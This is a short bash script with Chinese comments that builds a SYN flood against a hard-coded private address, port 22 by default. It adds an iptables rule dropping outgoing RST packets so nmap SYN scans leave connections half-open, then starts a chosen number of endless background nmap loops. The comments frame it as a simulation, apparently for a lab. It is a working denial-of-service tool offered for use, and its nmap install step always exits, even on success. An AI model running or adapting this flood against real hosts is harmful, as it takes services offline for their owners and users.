#!/bin/bash
#如何构造一个简单的syn泛洪攻击？

#客户端主机：
#1，利用iptables丢弃出方向的RESET报文
#因为nmap做syn扫描（发送syn，接受synack 后直接回复reset）时回发送reset断链，达不到模拟效果
#2，安装nmap
#利用nmap持续给主机某个端口发送syn，执行：
#while : ; do nmap  -nsS -p 22  192.168.101.216 > /dev/null ;done &
#可以多执行几次

#kill掉残留的进程
function kill_remain_sh(){
  numsofpid=$(pgrep -f "$0"|wc -l)
  if [ "$numsofpid" -gt 2 ] ;then
    echo "存在正在运行的程序,killing..."
    pgrep -f "$0"
    pgrep -f "$0" |grep -v $$| xargs kill -9 && echo "killed"
  fi
}

#清理iptables规则 
function rm_iptbs() {
  if iptables -S | grep "drop reset for nmap" ; then
    iptables -S | grep "drop reset for nmap" | awk '{ $1 = ""; print $0 }' | xargs -l iptables -D
    echo "cleanup iptables completed."
  fi
}


if [ $# -gt 2 ];then
  echo "useage: $0 <numbers of nmap> [port number]"
  exit 1
elif [ $# -eq 0 ];then
  echo "未加参数,只做清理"
  rm_iptbs
  kill_remain_sh
  echo "cleanup completed." 
  exit 0
fi

PORT=22
if [ -n "$2" ];then
  PORT=$2
fi

#一、如果有执行中的脚本，则先kill掉
kill_remain_sh

#二、安装nmap
if ! which nmap ;then
  echo "nmap未安装,安装中..."
  yum install nmap > /dev/null && echo "安装完成" || echo "安装失败" ; exit 1
else
  echo "nmap已经安装"
fi
#三、配置iptables规则在出方向丢弃RESET
iptables -A OUTPUT -p tcp -m tcp --dport "$PORT" -m tcp --tcp-flags RST RST -m comment --comment "drop reset for nmap" -j DROP



declare -i i=0
while [ $i -le "$1" ]
do
  while : ; do nmap  -nsS -p "$PORT"  192.168.101.216 > /dev/null ;done &
  i+=1
done
echo "start nmap success."

